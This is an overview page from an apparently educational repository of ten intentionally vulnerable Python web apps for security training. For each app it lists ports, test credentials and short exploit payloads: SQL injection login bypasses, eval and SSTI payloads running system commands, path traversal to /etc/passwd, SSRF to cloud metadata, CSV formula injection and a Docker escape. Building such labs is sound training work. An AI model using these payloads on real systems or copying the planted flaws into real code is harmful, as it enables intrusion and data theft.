# DVPP Projects - Detailed Overview

**Table of Contents**
- [SecureDoc - Document Management](#1-securedoc---document-management-system-port-5000)
- [VulnBlog - Blog/CMS Platform](#2-vulnblog---blogcms-platform-port-5001)
- [DataViz - Data Analytics](#3-dataviz---data-analytics-dashboard-port-5002)
- [FileShare - File Sharing](#4-fileshare---file-sharing-platform-port-5003)
- [APIGateway - REST API](#5-apigateway---rest-api-service-port-5004)
- [EcomStore - E-commerce](#6-ecomstore---e-commerce-shop-port-5005)
- [ChatApp - Real-time Chat](#7-chatapp---real-time-chat-port-5006)
- [AdminPanel - Admin Dashboard](#8-adminpanel---admin-dashboard-port-5007)
- [DSVPWA - Simple Vulnerable App](#9-dsvpwa---damn-simple-vulnerable-python-web-app-port-65413)
- [Python-VulnerableApp](#10-python-vulnerableapp-dvpwa---port-8080)

[← Back to README](../README.md)

---

## The Ten Projects

### 1. SecureDoc - Document Management System (PORT 5000)

**Status:** COMPLETE  
**Lines of Code:** 1,627  
**Architecture:** 4-layer (Models, Services, Utils, Views)  
**Complexity:** Medium-Large

**Vulnerabilities:** ~20 instances

- SQL Injection (10+ in models layer)
- IDOR - Insecure Direct Object References (5+)
- LFI - Local File Inclusion (5+)
- AFO - Arbitrary File Overwrite (4+)
- RCE - Remote Code Execution (6+ via eval/exec/subprocess/pickle)
- XSS - Cross-Site Scripting (10+)
- SSRF - Server-Side Request Forgery (8+)

**Quick Start:**

```bash
cd projects/securedoc && python run.py
# Or: docker-compose up --build
```

**Test Credentials:** `admin/admin123`, `user/password123`

**Key Exploits:**

- `/auth/login?username=admin'--` - SQL injection bypass
- `/docs/view/2` - IDOR to view other users' documents
- `/docs/read_file?file=../../etc/passwd` - LFI  
- `/admin/evaluate?expr=__import__('os').system('id')` - RCE
- `/admin/fetch_url?url=http://169.254.169.254/` - SSRF

[Full Documentation](../projects/securedoc/README.md) | [Exploits](../exploits/securedoc/)

[↑ Back to top](#dvpp-projects---detailed-overview)

---

### 2. VulnBlog - Blog/CMS Platform (PORT 5001)

**Status:** COMPLETE  
**Lines of Code:** ~800  
**Architecture:** 4-layer (Models, Services, Utils, Views)  
**Complexity:** Small-Medium

**Vulnerabilities:** ~12 instances

- XSS - Stored, Reflected (4)
- CSRF - Cross-Site Request Forgery (3)
- SSTI - Server-Side Template Injection (2)
- Auth/Session Bypass (2)
- SQL Injection (2)
- RCE via eval/exec (3)

**Quick Start:**

```bash
cd projects/vulnblog && python run.py
# Or: docker-compose up --build
```

**Test Credentials:** `admin/admin123`, `blogger/password`, `user/user`

**Key Exploits:**

- `POST /auth/login` - SQLi: `username=admin'--`
- `POST /posts/create` - Stored XSS in title/content
- `POST /admin/render` - SSTI: `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
- `POST /admin/evaluate` - RCE: `__import__('os').system('whoami')`
- `POST /admin/themes/activate/2` - CSRF (no token validation)

[Full Documentation](../projects/vulnblog/README.md) | [Exploits](../exploits/vulnblog/)

[↑ Back to top](#dvpp-projects---detailed-overview)

---

### 3. DataViz - Data Analytics Dashboard (PORT 5002)

**Status:** COMPLETE  
**Lines of Code:** ~1,400  
**Architecture:** 4-layer (Models, Services, Utils, Views)  
**Complexity:** Large

**Vulnerabilities:** ~13 instances

- Deserialization - pickle, jsonpickle (3)
- RCE - eval/exec for data analysis (5)
- CSV Injection - Formula injection (2)
- Info Disclosure (2)
- SSRF - External data fetching (1)

**Quick Start:**

```bash
cd projects/dataviz && python run.py
# Or: docker-compose up --build
```

**Key Exploits:**

- `POST /data/upload` - Upload malicious .pkl file
- `GET /data/load/1` - Trigger deserialization RCE
- `POST /analysis/eval` - RCE: `{"expr": "__import__('os').system('id')"}`
- `POST /analysis/execute` - RCE: `{"code": "import os; os.system('whoami')"}`
- `POST /export/csv` - CSV injection: `{"data": [["=cmd|'/c calc'!A1"]]}`
- `POST /data/load-remote` - SSRF: `{"url": "http://169.254.169.254/latest/meta-data/"}`

[Exploits](../exploits/dataviz/)

[↑ Back to top](#dvpp-projects---detailed-overview)

---

### 4. FileShare - File Sharing Platform (PORT 5003)

**Status:** COMPLETE  
**Lines of Code:** ~400  
**Architecture:** Single-file Flask app  
**Complexity:** Small

**Vulnerabilities:** ~9 instances

- File Upload RCE (2)
- Path Traversal (3)
- Local File Inclusion (1)
- XSS (1)
- Open Redirect (1)
- AFO via Zip Slip (1)

**Quick Start:**

```bash
cd projects/fileshare && python app.py
# Or: docker-compose up --build
```

**Key Exploits:**

- `POST /upload` - Upload .py file (auto-executes)
- `GET /download?path=/etc/passwd` - Path traversal
- `GET /view?file=/etc/passwd` - LFI
- `GET /redirect?url=http://evil.com` - Open redirect
- `POST /extract` - Zip slip vulnerability
- `POST /process` - Command injection

[Exploits](../exploits/fileshare/)

[↑ Back to top](#dvpp-projects---detailed-overview)

---

### 5. APIGateway - REST API Service (PORT 5004)

**Status:** COMPLETE  
**Lines of Code:** ~500  
**Architecture:** Single-file Flask app  
**Complexity:** Medium

**Vulnerabilities:** ~12 instances

- SSRF - API proxying (1)
- RCE - Command injection (1)
- Docker escape vulnerabilities (3)
- Auth Bypass (1)
- Info Disclosure (1)
- JWT bypass (1)

**Quick Start:**

```bash
cd projects/apigateway && python app.py
# Or: docker-compose up --build --privileged
```

**Key Exploits:**

- `POST /proxy` - SSRF: `{"url": "http://169.254.169.254/"}`
- `POST /exec` - RCE: `{"command": "whoami"}`
- `POST /docker/run` - Docker RCE: `{"image": "alpine", "command": "cat /etc/passwd"}`
- `POST /docker/socket` - Direct Docker daemon access
- `GET /admin` with header `X-Admin: true` - Auth bypass
- `GET /status` - Info disclosure (env vars, config)

[Exploits](../exploits/apigateway/)

[↑ Back to top](#dvpp-projects---detailed-overview)

---

### 6. EcomStore - E-commerce Shop (PORT 5005)

**Status:** COMPLETE  
**Lines of Code:** ~450  
**Architecture:** Single-file Flask app  
**Complexity:** Medium

**Vulnerabilities:** ~10 instances

- SQL Injection (2)
- XSS (2)
- CSRF (1)
- RCE via exec (1)
- Auth Bypass (1)
- Path Traversal (1)

**Quick Start:**

```bash
cd projects/ecomstore && python app.py
# Or: docker-compose up --build
```

**Test Credentials:** `admin/admin123`

**Key Exploits:**

- `POST /login` - SQLi: `username=admin'-- &password=x`
- `GET /products?search=<script>alert(1)</script>` - XSS
- `POST /order` - CSRF (no validation)
- `POST /admin/execute` - RCE: `{"code": "import os; os.system('id')"}`
- `GET /invoice?path=/etc/passwd` - Path traversal

[Exploits](../exploits/ecomstore/)

[↑ Back to top](#dvpp-projects---detailed-overview)

---

### 7. ChatApp - Real-time Chat (PORT 5006)

**Status:** COMPLETE  
**Lines of Code:** ~400  
**Architecture:** Single-file Flask app  
**Complexity:** Small

**Vulnerabilities:** ~7 instances

- XSS - Stored in messages (2)
- RCE via chatbot commands (3)
- Path Traversal (1)
- Info Disclosure (1)

**Quick Start:**

```bash
cd projects/chatapp && python app.py
# Or: docker-compose up --build
```

**Key Exploits:**

- `POST /send` - Stored XSS: `{"content": "<script>alert(1)</script>"}`
- `POST /bot` - RCE: `{"command": "/eval __import__('os').system('id')"}`
- `POST /bot` - RCE: `{"command": "/exec import os; os.system('whoami')"}`
- `POST /bot` - RCE: `{"command": "/run cat /etc/passwd"}`
- `GET /admin/read_log?file=/etc/passwd` - Path traversal
- `GET /debug` - Info disclosure

[Exploits](../exploits/chatapp/)

[↑ Back to top](#dvpp-projects---detailed-overview)

---

### 8. AdminPanel - Admin Dashboard (PORT 5007)

**Status:** COMPLETE  
**Lines of Code:** ~450  
**Architecture:** Single-file Flask app  
**Complexity:** Medium

**Vulnerabilities:** ~12 instances

- RCE cluster (3)
- Deserialization (1)
- Path Traversal (1)
- Docker escape (1)
- Account Takeover (1)
- Command injection (1)
- Multiple/Info disclosure (2)

**Quick Start:**

```bash
cd projects/adminpanel && python app.py
# Or: docker-compose up --build --privileged
```

**Key Exploits:**

- `POST /system/exec` - Command injection: `{"command": "whoami"}`
- `POST /system/eval` - RCE: `{"expression": "__import__('os').system('id')"}`
- `POST /system/python` - RCE: `{"code": "import os; os.system('whoami')"}`
- `POST /config/load` - Deserialization: Malicious pickle in base64
- `GET /logs/view?file=/etc/passwd` - Path traversal
- `POST /docker/exec` - Docker escape
- `POST /users/reset` - Account takeover (no verification)

[Exploits](../exploits/adminpanel/)

[↑ Back to top](#dvpp-projects---detailed-overview)

---

### 9. DSVPWA - Damn Simple Vulnerable Python Web App (PORT 65413)

**Status:** COMPLETE (Imported)  
**Lines of Code:** ~400  
**Architecture:** Single-file Flask-like app  
**Complexity:** Small

**Vulnerabilities:** ~12 instances

- SQL Injection (2 types - auth bypass, data extraction)
- XSS (Reflected + Stored)
- Command Injection (RCE via subprocess)
- Unsafe Deserialization (Pickle RCE)
- Path Traversal / LFI (with RFI support)
- Session Fixation
- Session Hijacking
- CSRF (state-changing GET requests)
- Clickjacking
- Open Redirect
- Execution After Redirect (EAR)

**Quick Start:**

```bash
cd projects/DSVPWA
python dsvpwa.py
# Or: docker build -t dsvpwa . && docker run -p 65413:65413 dsvpwa
```

**Key Exploits:**

- `/sqli?id=1 OR 1=1` - SQL injection
- `/login` - Auth bypass: `username=admin'--`
- `/xss_r?msg=<script>alert(1)</script>` - Reflected XSS
- `/guestbook` - Stored XSS in comments
- `/rce?command=ping;cat /etc/passwd&domain=8.8.8.8` - Command injection
- `/extract?object=<base64_pickle>` - Pickle deserialization RCE
- `/traversal?path=../../../etc/passwd` - Path traversal
- `/fixation?session_id=attacker_sid` - Session fixation
- `/settings?email=attacker@evil.com` - CSRF via GET
- `/redirect?path=http://evil.com` - Open redirect

[Exploits](../exploits/dsvpwa/)

[↑ Back to top](#dvpp-projects---detailed-overview)

---

### 10. Python-VulnerableApp (DVPWA) - Port 8080

**Status:** COMPLETE (Imported)  
**Lines of Code:** ~800  
**Architecture:** aiohttp + Jinja2 + PostgreSQL  
**Complexity:** Medium

**Vulnerabilities:** ~6 primary types

- SQL Injection via Python string formatting (CRITICAL)
- XSS via Jinja2 autoescape=False (HIGH)
- CSRF protection completely disabled (MEDIUM)
- MD5 password hashing (HIGH)
- Missing security headers (LOW)
- Information disclosure (MEDIUM)

**Quick Start:**

```bash
cd projects/Python-VulnerableApp
docker-compose up --build
```

**Test Credentials:** Check database after startup

**Key Vulnerabilities:**

1. **SQL Injection** - String formatting in queries
2. **XSS** - `autoescape=False` in Jinja2 templates
3. **CSRF** - Middleware commented out
4. **Weak Crypto** - MD5 for passwords instead of bcrypt
5. **Missing Headers** - No X-Frame-Options, CSP, etc.

**Key Exploits:**

- Login SQLi: `username=admin' OR '1'='1'--`
- Reflected XSS: `search?q=<script>alert(1)</script>`
- CSRF on all state-changing endpoints
- MD5 hash cracking from database

[Exploits](../exploits/python-vulnerableapp/)

[↑ Back to top](#dvpp-projects---detailed-overview)

---

[← Back to README](../README.md)
